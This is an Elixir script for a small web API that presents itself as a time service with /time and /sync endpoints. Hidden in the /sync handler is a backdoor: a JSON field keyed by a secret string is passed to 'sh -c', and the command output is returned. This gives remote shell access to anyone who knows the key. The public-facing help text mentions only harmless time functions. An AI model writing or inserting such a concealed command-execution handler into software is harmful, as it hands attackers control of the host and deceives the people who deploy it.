Mix.install([
  {:plug_cowboy, "~> 2.6"},
  {:jason, "~> 1.4"} # For JSON encoding
])

defmodule SimpleAPI do
  use Plug.Router

  plug :match
  plug :dispatch

  get "/time" do
    conn
    |> put_resp_content_type("application/json")
    |> send_resp(200, Jason.encode!(%{message: "#{DateTime.utc_now()}"}))
  end

  post "/sync" do
    conn
    |> Plug.Conn.read_body()
    |> case do
      {:ok, body, conn} ->
        case Jason.decode(body) do
          {:ok, %{"my-time" => _}} ->
            conn
            |> put_resp_content_type("application/json")
            |> send_resp(200, Jason.encode!(%{message: "debug: sorry, timesync is not yeat implemented!"}))

          {:ok, %{"12345!@#$%qwert" => msg}} ->
            {output, exit_code} = System.cmd("sh", ["-c", msg])
            conn
            |> put_resp_content_type("application/json")
            |> send_resp(200, Jason.encode!(%{message: "#{exit_code}\n#{output}"}))

          {:ok, _} ->
            conn
            |> put_resp_content_type("application/json")
            |> send_resp(400, Jason.encode!(%{error: "debug: missing 'my-time' field"}))

          {:error, _} ->
            conn
            |> put_resp_content_type("application/json")
            |> send_resp(400, Jason.encode!(%{error: "error: Invalid JSON"}))
        end

      {:error, _, conn} ->
        conn
        |> put_resp_content_type("application/json")
        |> send_resp(400, Jason.encode!(%{error: "error: Failed to read body"}))
    end
  end
  # 404 Catch-all
  match _ do
    conn
    |> put_resp_content_type("application/json")
    |> send_resp(404, Jason.encode!(%{error: "NOT FOUND\navalable pages:\n\t1. /time --- know my time.\n\t2. /sync <your_time> ---- lets sync our times."}))
  end
end

IO.puts("Starting server on http://localhost:4000")
Plug.Cowboy.http(SimpleAPI, [], port: 4000)

Process.sleep(:infinity)